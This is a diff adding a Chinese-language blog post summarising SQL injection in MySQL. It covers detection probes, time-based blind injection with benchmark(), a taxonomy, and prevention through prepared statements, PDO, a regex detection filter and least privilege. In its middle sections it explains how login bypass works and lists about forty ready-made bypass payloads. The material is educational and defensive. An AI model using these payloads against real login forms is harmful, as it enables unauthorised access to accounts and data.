@@ -1,0 +1,160 @@
+<hr>
+<h2 id="title-SQL注入总结date-2024-05-20categories-Web安全-注入漏洞tags-SQL注入-数据库"><a href="#title-SQL注入总结date-2024-05-20categories-Web安全-注入漏洞tags-SQL注入-数据库" class="headerlink" title="title: SQL注入总结date: 2024-05-20categories:  - Web安全  - 注入漏洞tags:  - SQL注入  - 数据库"></a>title: SQL注入总结<br>date: 2024-05-20<br>categories:<br>  - Web安全<br>  - 注入漏洞<br>tags:<br>  - SQL注入<br>  - 数据库</h2><h1 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h1><h2 id="什么是-Sql-注入？"><a href="#什么是-Sql-注入？" class="headerlink" title="什么是 Sql 注入？"></a>什么是 Sql 注入？</h2><p>SQL 注入是比较常见的网络攻击方式之一，它不是利用操作系统的 BUG 来实现攻击，而是针对程序员编写时的疏忽，通过 SQL 语句，实现无账号登录，甚至篡改数据库。</p>
+<p>由于以下的环境都是 MySQL 数据库，所以先了解点 MySQL 有关的知识。在 MySQL5.0 之后，MySQL 中默认添加了一个名为<code>information_schema</code>​的数据库，<u>该数据库中的表都是</u>​<u><strong>只读的</strong></u>​<u>，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个</u>​<u><strong>视图</strong></u>​<u>，不是</u>​<u><strong>基本表</strong></u>​<u>，</u>​<u><strong>没有关联的文件</strong></u>​<u>。</u></p>
+<pre><code>mysql中注释符：#   、/**/ 、  --
+</code></pre>
+<h4 id="information-schema-中三个很重要的表："><a href="#information-schema-中三个很重要的表：" class="headerlink" title="information_schema 中三个很重要的表："></a>information_schema 中三个很重要的表：</h4><ul>
+<li>information_schema.<strong>schemata</strong>: 该数据表存储了 mysql 数据库中的所有数据库的<code>库名</code>​</li>
+<li>information_schema.<strong>tables</strong>： 该数据表存储了 mysql 数据库中的所有数据表的<code>表名</code>​</li>
+<li>information_schema.<strong>columns</strong>: 该数据表存储了 mysql 数据库中的所有列的<code>列名</code>​</li>
+</ul>
+<h2 id="Mysql-中常用的函数"><a href="#Mysql-中常用的函数" class="headerlink" title="Mysql 中常用的函数"></a>Mysql 中常用的函数</h2><pre><code class="language-bash">version():查询数据库的版本
+user():查询数据库的使用者
+database():数据库
+system_user():系统用户名
+session_user():连接数据库的用户名
+current_user():当前用户名
+load_file():读取本地文件
+@@datadir:读取数据库路径
+@@basedir:mysql安装路径
+@@version_complie_os:查看操作系统
+</code></pre>
+<hr>
+<h2 id="判断-SQL-注入是否存在"><a href="#判断-SQL-注入是否存在" class="headerlink" title="判断 SQL 注入是否存在"></a>判断 SQL 注入是否存在</h2><ul>
+<li>先加单引号<code>&#39;</code>​、双引号<code>&quot;</code>​、单括号<code>)</code>​、双括号<code>))</code>​等看看是否<strong>报错</strong>，如果报错就可能存在 SQL 注入漏洞了。</li>
+<li>还有在 URL 后面加<code>and 1 = 1 、 and 1 = 2</code>​看页面是否显示一样，<strong>显示不一样</strong>的话，肯定存在 SQL 注入漏洞了。</li>
+<li>还有就是<code>Timing Attack</code>​测试，也就是<code>时间盲注</code>​。有时候通过简单的条件语句比如 <strong>and 1&#x3D;2</strong> 是无法看出异常的。</li>
+<li>在 MySQL 中，有一个<code>Benchmark()</code>​函数，它是用于<strong>测试性能</strong>的。<u>Benchmark(count,expr)，这个函数执行的结果，是将</u>​<u><strong>表达式expr执行count次</strong></u>​<u> 。</u></li>
+</ul>
+<p>因此，利用<code>benchmark函数</code>​，<u>可以让</u>​<u><strong>同一个函数执行若干次</strong></u>​<u>，使得结果返回的时间比平时要长，通过</u>​<u><strong>时间长短</strong></u>​<u>的变化，可以判断注入语句是否执行成功。</u>这是一种<strong>边信道攻击</strong>，这个技巧在盲注中被称为<code>Timing Attack</code>​，也就是<code>时间盲注</code>​。</p>
+<p><strong>易出现 SQL 注入的功能点：</strong> 凡是和<code>数据库有交互</code>​的地方都容易出现 SQL 注入，SQL 注入经常出现在登陆页面、涉及获取 HTTP 头（<strong>user-agent &#x2F; client-ip</strong> 等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在 HTTP 头中的 <strong>client-ip</strong> 和 <strong>x-forward-for</strong> 等字段处。这些字段是用来记录<strong>登陆的 ip</strong> 的，有可能会被<strong>存储进数据库</strong>中从而与数据库发生交互导致 sql 注入。</p>
+<h2 id="Sql-注入的分类"><a href="#Sql-注入的分类" class="headerlink" title="Sql 注入的分类"></a>Sql 注入的分类</h2><hr>
+<table>
+<thead>
+<tr>
+<th>分类依据</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>获取信息的方式</td>
+<td>布尔盲注，时间盲注，报错注入 ，union查询注入，堆叠注入等</td>
+</tr>
+<tr>
+<td>提交方式</td>
+<td>GET、POST、COOKIE、HTTP 注入等</td>
+</tr>
+<tr>
+<td>注入点类型</td>
+<td>数字类型的注入、字符串类型的注入、搜索型注入等</td>
+</tr>
+<tr>
+<td>其他注入</td>
+<td>二次注入、User-Agent 注入、文件读写、宽字节注入 、万能密码 等</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原验证登陆语句:</p>
+<pre><code>SELECT * FROM admin WHERE Username= &#39;&quot;.$username.&quot;&#39; AND Password= &#39;&quot;.md5($password).&quot;&#39;
+</code></pre>
+<p>输入<code>1&#39; or 1=1 or &#39;1&#39;=&#39;1</code>​万能密码语句变为:</p>
+<pre><code>SELECT * FROM admin WHERE Username=&#39;1&#39; OR 1=1 OR &#39;1&#39;=&#39;1&#39; AND Password=&#39;EDFKGMZDFSDFDSFRRQWERRFGGG&#39;
+</code></pre>
+<p>即得到优先级关系：<code>or&lt;and&lt;not</code>​，同一优先级默认从左往右计算。</p>
+<ul>
+<li>上面<code>&#39;1&#39;=&#39;1&#39; AND Password=&#39;EDFKGMZDFSDFDSFRRQWERRFGGG&#39;</code>​<strong>先计算</strong>肯定返回<code>false</code>​,因为密码是我们乱输入的。(此处是假)</li>
+<li>Username=‘1’ 返回假，数据库没有1这个用户名(此处是假)</li>
+<li>1=1返回真(此处是真)</li>
+</ul>
+<p>以上的结果是:<code>假 or 真 or假</code>​返回<code>真</code>​。验证通过。再比如：</p>
+<pre><code>select tel,pwd where tel=&#39;111&#39; and pwd=&#39;123456&#39;
+</code></pre>
+<p>我们把电话111看成一个变量，输入电话号码为<code>&#39; or 1= &#39;1</code>​。</p>
+<p>sql就变为如下样子：</p>
+<pre><code>select  tel,pwd where tel=&#39;&#39; or 1=&#39;1&#39; and pwd=&#39;123456&#39;
+</code></pre>
+<ul>
+<li>上面<code>1=&#39;1&#39; and pwd=&#39;123456&#39;</code>​<strong>先计算</strong>肯定返回<code>false</code>​。(此处是假)</li>
+<li>tel=‘’ 返回假，数据库没有<code>&#39;&#39;</code>​这个手机号。(此处是假)</li>
+</ul>
+<p>以上的结果是:<code>真 or假</code>​返回<code>真</code>​。验证通过。</p>
+<h3 id="常用的万能密码"><a href="#常用的万能密码" class="headerlink" title="常用的万能密码"></a>常用的万能密码</h3><hr>
+<pre><code>&#39; or 1=&#39;1
+&#39;or&#39;=&#39;or&#39;
+admin
+admin&#39;--
+admin&#39; or 4=4--
+admin&#39; or &#39;1&#39;=&#39;1&#39;--
+admin888
+&quot;or &quot;a&quot;=&quot;a
+admin&#39; or 2=2#
+a&#39; having 1=1#
+a&#39; having 1=1--
+admin&#39; or &#39;2&#39;=&#39;2
+&#39;)or(&#39;a&#39;=&#39;a
+or 4=4--
+c
+a&#39;or&#39; 4=4--
+&quot;or 4=4--
+&#39;or&#39;a&#39;=&#39;a
+&quot;or&quot;=&quot;a&#39;=&#39;a
+&#39;or&#39;&#39;=&#39;
+&#39;or&#39;=&#39;or&#39;
+1 or &#39;1&#39;=&#39;1&#39;=1
+1 or &#39;1&#39;=&#39;1&#39; or 4=4
+&#39;OR 4=4%00
+&quot;or 4=4%00
+&#39;xor
+admin&#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;=&#39;
+1
+-1%cf&#39; union select 1,1,1 as password,1,1,1 %23
+1
+17..admin&#39; or &#39;a&#39;=&#39;a 密码随便
+&#39;or&#39;=&#39;or&#39;
+&#39;or 4=4/*
+something
+&#39; OR &#39;1&#39;=&#39;1
+1&#39;or&#39;1&#39;=&#39;1
+admin&#39; OR 4=4/*
+1&#39;or&#39;1&#39;=&#39;1
+</code></pre>
+<hr>
+<h2 id="Sql-注入的预防"><a href="#Sql-注入的预防" class="headerlink" title="Sql 注入的预防"></a>Sql 注入的预防</h2><p><u>一般在项目中我们不太会去注意 SQL 注入的问题</u>，因为我们会使用 <strong>ORM</strong>，而 ORM 在实现的过程中也会帮我做 SQL 注入过滤；但有的时候 ORM 没法满足我们的需求，这时可能就会手撸原生 SQL 来执行</p>
+<h3 id="预编译-PreparedStatement-JSP"><a href="#预编译-PreparedStatement-JSP" class="headerlink" title="预编译(PreparedStatement)(JSP)"></a>预编译(PreparedStatement)(JSP)</h3><hr>
+<p>可以采用预编译语句集，它内置了处理SQL注入的能力，只要使用它的setXXX方法传值即可。</p>
+<pre><code>String sql = &quot;select id, no from user where id=?&quot;;
+PreparedStatement ps = conn.prepareStatement(sql);
+ps.setInt(1, id);
+ps.executeQuery();
+</code></pre>
+<p>如上所示，就是典型的采用 SQL语句预编译来防止SQL注入 。为什么这样就可以防止SQL注入呢？</p>
+<p>其原因就是：采用了PreparedStatement预编译，就会将SQL语句：”select id, no from user where id=?” 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会<strong>影响该SQL语句的语法结构了</strong>，因为<strong>语法分析已经完成了</strong>，而语法分析<strong>主要是分析SQL命令</strong>，比如 select、from 、where 、and、 or 、order by 等等。所以即使你后面<strong>输入了这些SQL命令</strong>，<strong>也不会被当成SQL命令来执行了</strong>，因为这些SQL命令的执行， 必须先通过<strong>语法分析</strong>，生成<strong>执行计划</strong>，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为SQL命令来执行的，只会被当做字符串字面值参数。所以SQL语句<strong>预编译</strong>可以有效防御SQL注入。</p>
+<p>原理：SQL注入只对SQL语句的编译过程有破坏作用，而PreparedStatement已经预编译好了，执行阶段只是把输入串作为数据处理。而不再对SQL语句进行解析。因此也就避免了sql注入问题。</p>
+<h3 id="PDO（PHP）"><a href="#PDO（PHP）" class="headerlink" title="PDO（PHP）"></a>PDO（PHP）</h3><p>首先简单介绍一下什么是<strong>PDO</strong>。PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持PDO。你可以把PDO看做是php提供的一个类。它提供了一组<strong>数据库抽象层</strong>API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用PDO连接mysql，也可以用它连接oracle。并且PDO很好的解决了sql注入问题。</p>
+<p>PDO对于解决SQL注入的原理也是<strong>基于预编译</strong>。</p>
+<pre><code>$data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );
+$data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );
+$data-&gt;execute();
+</code></pre>
+<p>实例化PDO对象之后，首先是对请求SQL语句做预编译处理。在这里，我们使用了<strong>占位符的方式</strong>，将该SQL传入prepare函数后，预处理函数就会得到本次查询语句的SQL模板类，并将这个模板类返回，模板可以<strong>防止传那些危险变量</strong>改变本身查询语句的语义。然后使用 bindParam()函数对用户输入的数据和参数id进行绑定，最后再执行.</p>
+<h3 id="使用正则表达式过滤"><a href="#使用正则表达式过滤" class="headerlink" title="使用正则表达式过滤"></a>使用正则表达式过滤</h3><p>正则表达式是一种用于匹配模式的工具，在检测 SQL 注入时非常有用。我们可以使用正则表达式来过滤和验证用户输入，以确保输入不包含任何恶意的 SQL 代码。下面是一些常见的正则表达式示例：</p>
+<p>对用户输入的特殊字符进行严格过滤，如 ‘、”、&lt;、&gt;、&#x2F;、*、;、+、-、&amp;、|、(、)、and、or、select、union</p>
+<pre><code>pattern = re.compile(
+r&quot;(%27)|(\&#39;)|(\-\-)|(%23)|(#)|&quot;  # Regex for detection of SQL meta-characters
+r&quot;\w*((%27)|(\&#39;))\s+((%6F)|o|(%4F))((%72)|r|(%52))\s*|&quot;  # Modified regex for detection of SQL meta-characters eg: &#39; or 1 = 1&#39; detect word &#39;or&#39;,
+r&quot;((%3D)|(=))[^\n]*((%27)|(\&#39;)|(\-\-)|(%3B)|(;))&quot;  # Regex for typical SQL Injection attack eg: &#39;= 1 --&#39;
+r&quot;((%27)|(\&#39;))union|&quot;  # Regex for detecting SQL Injection with the UNION keyword
+r&quot;((%27)|(\&#39;))select|&quot;  # Regex for detecting SQL Injection with the UNION keyword
+r&quot;((%27)|(\&#39;))insert|&quot;  # Regex for detecting SQL Injection with the UNION keyword
+r&quot;((%27)|(\&#39;))update|&quot;  # Regex for detecting SQL Injection with the UNION keyword
+r&quot;((%27)|(\&#39;))drop&quot;,  # Regex for detecting SQL Injection with the UNION keyword
+re.IGNORECASE,
+)
+r = pattern.search(&quot;&#39; OR 1 -- -&quot;)
+if r:
+return True
+</code></pre>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Web 应用中用于<strong>连接数据库的用户</strong>与<strong>数据库的系统管理员用户</strong>的权限有严格的区分（如不能执行 drop 等），并设置 Web 应用中用于连接数据库的用户不允许操作其他数据库。</p>
+<p>设置 Web 应用中用于连接数据库的用户对 Web 目录不允许有写权限。</p>
+<p>严格限定参数类型和格式，明确参数检验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查。</p>
+<p>使用 Web 应用防火墙。</p>
